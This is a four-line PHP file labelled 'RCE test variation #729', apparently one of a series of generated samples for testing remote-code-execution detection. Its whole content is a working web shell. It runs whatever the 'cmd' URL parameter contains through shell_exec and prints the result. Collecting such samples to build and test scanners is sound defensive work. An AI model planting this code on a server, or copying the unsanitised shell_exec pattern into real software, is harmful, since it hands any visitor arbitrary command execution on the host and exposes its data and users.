<?php
// RCE test variation #729
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>